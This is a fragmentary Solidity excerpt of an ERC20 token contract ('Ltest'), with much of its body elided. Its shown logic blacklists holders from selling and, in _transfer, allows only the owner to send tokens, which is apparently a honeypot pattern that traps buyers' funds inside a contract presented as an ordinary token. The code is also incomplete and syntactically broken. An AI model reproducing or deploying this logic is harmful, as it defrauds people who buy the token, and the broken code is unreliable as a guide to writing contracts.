...
contract wed is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Ltest";
    string public _symbol= "Ltest";
     bool balances1 = true;
    ...
    require(!_blackbalances[account], "Account is blacklisted");
    _;
    }
    modifier onlyOwner {
    ...
    function transfer(address recipient, uint256 amount) public virtual override notBlacklisted(_msgSender()) returns (bool) {
    require(!_blackbalances[msg.sender], "Sender is not allowed to sell or transfer");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override notBlacklisted(_msgSender()) returns (bool) {
    require(!_blackbalances[sender], "Sender is not allowed to sell or transfer");
    require(!_blackbalances[recipient], "Recipient is not allowed to receive");
    require(!isVesting(sender), "ERC20: sender is blacklisted");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(msg.sender == owner, "ERC20: transfer from blacklisted address is not allowed");
   {
    ...
    _balances[recipient] += amount - burnAmount - charityAmount;
    if (burnAmount > 0) {
    ...
    emit Transfer(sender, recipient, amount - burnAmount - charityAmount);
}
